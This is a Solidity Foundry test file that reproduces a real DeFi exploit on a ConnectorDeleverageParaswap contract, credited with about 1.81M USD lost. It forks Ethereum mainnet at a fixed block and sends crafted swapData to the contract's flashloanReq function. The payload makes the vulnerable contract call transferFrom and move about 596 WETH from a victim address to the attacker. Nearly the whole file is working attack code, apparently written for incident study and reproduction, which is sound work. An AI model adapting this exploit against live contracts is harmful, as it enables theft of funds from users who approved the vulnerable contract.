// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~1.81M USD
// TX : https://app.blocksec.com/explorer/tx/eth/0x92cdcc732eebf47200ea56123716e337f6ef7d5ad714a2295794fdc6031ebb2e
// Attacker : https://etherscan.io/address/0x67104175fc5fabbdb5a1876c3914e04b94c71741
// Attack Contract : https://etherscan.io/address/0x11a8dc866c5d03ff06bb74565b6575537b215978
// GUY : https://x.com/CertiKAlert/status/1811668992882307478

import "forge-std/Test.sol";
import "./../interface.sol";

interface  ConnectorDeleverageParaswap{
  function flashloanReq(bool _opt, address[] memory debtTokens, uint256[] memory debtAmounts, uint256[] memory debtRateMode, address[] memory collateralTokens, uint256[] memory collateralAmounts, bytes[] memory swapData) external;
}
contract ContractTest is Test {
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ConnectorDeleverageParaswap vulnContract=ConnectorDeleverageParaswap(0x9f54e8eAa9658316Bb8006E03FFF1cb191AafBE6);
    IAaveFlashloan aave = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    address onBehalfOf=0x534a3bb1eCB886cE9E7632e33D97BF22f838d085;
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        vm.createSelectFork("mainnet", 20288622);
        deal(address(USDC),address(this), 80000000 ether);   //FlashLoan
    }

    function testExploit() public {
        attack();
        emit log_named_decimal_uint("[End] Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals());

    }
    function attack() public {
        USDC.approve(address(aave), type(uint256).max);
        aave.repay(address(USDC), 938566826811,2,address(onBehalfOf));
        USDC.transfer(address(vulnContract),6000000);
        address[] memory debtTokens = new address[](1);
        debtTokens[0] = address(USDC);
        uint256[] memory debtAmounts = new uint256[](1);
        debtAmounts[0] = 5000000;
        uint256[] memory debtRateMode = new uint256[](1);
        debtRateMode[0] = 0;
        address[] memory collateralTokens = new address[](0);
        uint256[] memory collateralAmounts = new uint256[](0);
        bytes[] memory swapData = new bytes[](2);
        swapData[0] = abi.encode(address(USDC),address(USDC),type(uint128).max,type(uint128).max,address(onBehalfOf),address(onBehalfOf),
        abi.encodeWithSelector(bytes4(0x75b4b22d), 22,address(USDC),5000000,address(WETH),596744648055377423623,2));
        swapData[1] = abi.encode(address(USDC),address(USDC),type(uint128).max,type(uint128).max,address(WETH),address(aave),
        abi.encodeWithSelector(bytes4(0x23b872dd), address(onBehalfOf),address(this),596744648055377423623));
        vulnContract.flashloanReq(false, debtTokens, debtAmounts, debtRateMode, collateralTokens, collateralAmounts, swapData);
    }
    function executeAction(uint256 _connectorId, address _tokenIn, uint256 _inAmount, address _tokenOut, uint256 _outAmount, uint256 _actionId) external payable {
    }
    receive() external payable {}
}

